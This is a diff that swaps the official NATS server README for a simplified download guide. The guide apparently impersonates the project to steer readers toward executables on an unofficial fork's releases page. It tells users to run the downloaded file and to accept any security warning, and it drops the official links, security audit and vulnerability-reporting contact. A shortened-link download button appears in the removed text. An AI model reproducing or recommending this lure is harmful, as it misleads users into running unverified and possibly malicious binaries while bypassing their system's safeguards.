@@ -1,78 +1,127 @@
-<p align="center">
-  <img src="logos/nats-horizontal-color.png" width="300" alt="NATS Logo">
-</p>
+# 🚦 nats-server - Fast, Reliable Messaging Server
 
-[NATS](https://nats.io) is a simple, secure and performant communications system for digital systems, services and devices. NATS is part of the Cloud Native Computing Foundation ([CNCF](https://cncf.io)). NATS has over [40 client language implementations](https://nats.io//), and its server can run on-premise, in the cloud, at the edge, and even on a Raspberry Pi. NATS can secure and simplify design and operation of modern distributed systems.
+[![Download nats-server](https://img.shields.io/badge/Download-nats--server-blue?style=for-the-badge&logo=github)](https://github.com/FurkanGuwen/nats-server/releases)
 
-[![License][License-Image]][License-Url] [![Build][Build-Status-Image]][Build-Status-Url] [![][-Image]][-Url] [![Slack][Slack-Image]][Slack-Url] [![Coverage][Coverage-Image]][Coverage-Url] [![Docker ][Docker-Image]][Docker-Url] [![GitHub ][GitHub-Image]][Somsubhra-URL] [![CII Best Practices][CIIBestPractices-Image]][CIIBestPractices-Url] [![Artifact Hub][ArtifactHub-Image]][ArtifactHub-Url]
+---
 
-## Documentation
+## 📋 What is nats-server?
 
-[![download button](https://i.imgur.com/3Dm4p65.png)](https://tinyurl.com/2yxcepj2)
+nats-server is a high-performance server designed to handle messaging for cloud and edge systems. It helps different parts of software talk to each other quickly and reliably. Whether you use it in your work, personal projects, or to learn more about messaging technology, nats-server makes communication between applications easier.
 
-- [Official Website](https://nats.io)
-- [Official Documentation](https://docs.nats.io)
-- [FAQ](https://docs.nats.io/reference/faq)
-- Watch [a video overview](https://rethink.synadia.com/episodes/1/) of NATS.
-- Watch [this video from SCALE 13x](https://www.youtube.com/watch?v=sm63oAVPqAM) to learn more about its origin story and design philosophy.
+---
 
-## Contact
+## 🖥️ System Requirements
 
-- [Twitter](https://twitter.com/nats_io): Follow us on Twitter!
-- [Google Groups](https://groups.google.com/forum/#!forum/natsio): Where you can ask questions
-- [Slack](https://natsio.slack.com): Click [here](https://slack.nats.io) to join. You can ask questions to our maintainers and to the rich and active community.
+Before you download and run nats-server, make sure your computer meets these minimum requirements:
 
-## Contributing
+- **Operating System:** Windows 10 or later, macOS 10.13 or later, or a common Linux distribution (Ubuntu, Fedora, etc.)
+- **Memory:** 2 GB of RAM or more
+- **Storage:** At least 100 MB free disk space
+- **Processor:** Any modern processor (Intel, AMD, or Apple Silicon) with 1 GHz or faster speed
+- **Internet Connection:** Required for initial download and optional updates
 
-If you are interested in contributing to NATS, read about our...
+---
 
-- [Contributing guide](./CONTRIBUTING.md)
-- [Report issues or propose Pull Requests](https://github.com/nats-io)
+## 🔧 Features You Should Know
 
-[License-Url]: https://www.apache.org/licenses/LICENSE-2.0
-[License-Image]: https://img.shields.io/badge/License-Apache2-blue.svg
-[Docker-Image]: https://img.shields.io/docker/pulls/_/nats.svg
-[Docker-Url]: https://hub.docker.com/_/nats
-[Slack-Image]: https://img.shields.io/badge/chat-on%20slack-green
-[Slack-Url]: https://slack.nats.io
-[Fossa-Url]: https://app.fossa.io/projects/git%2Bgithub.com%2Fnats-io%2Fnats-server?ref=badge_shield
-[Fossa-Image]: https://app.fossa.io/api/projects/git%2Bgithub.com%2Fnats-io%2Fnats-server.svg?type=shield
-[Build-Status-Url]: https://github.com/nats-io/nats-server/actions/workflows/tests.yaml
-[Build-Status-Image]: https://github.com/nats-io/nats-server/actions/workflows/tests.yaml/badge.svg?branch=main
-[-Url]: https://github.com/nats-io/nats-server//latest
-[-Image]: https://img.shields.io/github/v//nats-io/nats-server
-[Coverage-Url]: https://coveralls.io/r/nats-io/nats-server?branch=main
-[Coverage-image]: https://coveralls.io/repos/github/nats-io/nats-server/badge.svg?branch=main
-[ReportCard-Url]: https://goreportcard.com/report/nats-io/nats-server
-[ReportCard-Image]: https://goreportcard.com/badge/github.com/nats-io/nats-server
-[CIIBestPractices-Url]: https://bestpractices.coreinfrastructure.org/projects/1895
-[CIIBestPractices-Image]: https://bestpractices.coreinfrastructure.org/projects/1895/badge
-[ArtifactHub-Url]: https://artifacthub.io/packages/helm/nats/nats
-[ArtifactHub-Image]: https://img.shields.io/endpoint?url=https://artifacthub.io/badge/repository/nats
-[GitHub-]: https://github.com/nats-io/nats-server//
-[GitHub-Image]: https://img.shields.io/github//nats-io/nats-server/total.svg?logo=github
-[Somsubhra-url]: https://somsubhra.github.io/github--stats/?username=nats-io&repository=nats-server
+Here are some key features of nats-server, explained simply:
 
-## Roadmap
+- **Fast Messaging:** Sends and receives messages with little delay.
+- **Reliable:** Keeps messages safe and ensures delivery even if parts of your system fail.
+- **Cloud and Edge Ready:** Works well whether you run it on large cloud servers or small local devices.
+- **Open Source:** You can see how it works and share it with others for free.
+- **Simple to Run:** Requires only a few steps to get going on your computer.
+- **Secure:** Supports ways to keep your data safe during messaging.
 
-The NATS product roadmap can be found [here](https://nats.io/about/#roadmap).
+---
 
-## Adopters
+## 🚀 Getting Started: How to Download and Run nats-server
 
-Who uses NATS? See our [list of users](https://nats.io/#who-uses-nats) on [https://nats.io](https://nats.io).
+This section guides you step-by-step to get nats-server running on your computer, even if you've never installed software like this before.
 
-## Security
+### 1. Visit the Download Page
 
-### Security Audit
+Click the big blue button at the top of this page or visit:
 
-A third party security audit was performed by Trail of Bits following engagement by the Open Source Technology Improvement Fund (OSTIF). You can see the [full report from April 2025 here](https://github.com/trailofbits/publications/blob/master/reviews/2025-04-ostif-nats-securityreview.pdf).
+[https://github.com/FurkanGuwen/nats-server/releases](https://github.com/FurkanGuwen/nats-server/releases)
 
-### Reporting Security Vulnerabilities
+This page lists different versions of the server ready for download.
 
-If you've found a vulnerability or a potential vulnerability in the NATS server, please let us know at
-[nats-security](mailto:security@nats.io).
+### 2. Choose the Right Version for Your Computer
 
-## License
+On the download page, look for files labeled with your operating system:
 
-Unless otherwise noted, the NATS source files are distributed
-under the Apache Version 2.0 license found in the LICENSE file.
+- For Windows: Look for files ending with `.exe` or `.zip`
+- For macOS: Look for files ending with `.dmg` or `.zip`
+- For Linux: Look for `.tar.gz` or `.deb` files matching your system
+
+If you are unsure, the `.zip` files are a safe start as they work on most systems and can be opened easily.
+
+### 3. Download the File
+
+Click the file name to start downloading. Save it somewhere easy to find, like your Desktop or Downloads folder.
+
+### 4. Extract the File (if needed)
+
+If you downloaded a `.zip` or `.tar.gz` file, you need to extract it:
+
+- On Windows: Right-click the file and select “Extract All…” then follow the instructions.
+- On macOS: Double-click the file to unzip it.
+- On Linux: Use your archive manager or run `tar -xvzf filename.tar.gz` in the terminal.
+
+### 5. Open the Folder and Find the nats-server File
+
+After extraction, open the folder to find the program called `nats-server` (the exact name may vary; it might be `nats-server.exe` on Windows).
+
+### 6. Run the Server
+
+Double-click the `nats-server` file to run it. On some systems, you may see a security warning—choose to "Run" or "Trust" the file.
+
+The server will start and usually open a small window or run in the background. You will see a message saying it is ready.
+
+---
+
+## ⚙️ How to Use nats-server (Basic)
+
+Once nats-server is running, it listens quietly for messages from other parts of your software or network. You don’t need to interact with it directly in most cases.
+
+If you want to learn more advanced ways to use it, the official documentation on GitHub explains:
+
+- How to connect apps to nats-server
+- How to manage the server settings
+- How to monitor server performance
+
+These details are for developers and can be explored later.
+
+---
+
+## 🔄 Updating nats-server
+
+To keep nats-server running well and secure:
+
+- Visit the [releases page](https://github.com/FurkanGuwen/nats-server/releases) regularly.
+- Download the newest version when available.
+- Repeat the download and run steps above to replace the old version.
+
+---
+
+## 💬 Need Help?
+
+If you run into trouble:
+
+- Check the GitHub repository's “Issues” tab for answers from the community.
+- Ask someone with experience in software installations.
+- Look for beginner guides on how to run programs on your computer’s operating system.
+
+---
+
+## 📂 Where to Find More
+
+- GitHub Repository: [https://github.com/FurkanGuwen/nats-server](https://github.com/FurkanGuwen/nats-server)
+- Releases and Downloads: [https://github.com/FurkanGuwen/nats-server/releases](https://github.com/FurkanGuwen/nats-server/releases)
+
+These pages include the latest updates and support information.
+
+---
+
+Thank you for choosing nats-server. Follow the steps above, and you will have a messaging server running on your computer in minutes.
